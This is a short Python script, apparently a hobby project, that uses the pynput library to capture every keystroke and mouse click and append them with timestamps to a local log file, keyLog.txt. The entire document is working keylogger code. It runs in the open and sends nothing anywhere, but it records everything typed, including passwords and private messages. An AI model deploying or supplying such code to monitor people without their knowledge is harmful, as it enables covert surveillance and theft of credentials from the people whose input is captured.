from pynput import keyboard
from pynput import mouse
import logging

log_dir = "C:/Users/Cassandra McCormack/Key Logger"
logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    print(key)

def on_click(x, y, button, pressed):
    if pressed:
        logging.info(str(button))
        print (button)

#allows mouse and keyboard listeners to be used concurrently
with mouse.Listener(on_click=on_click) as listener:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

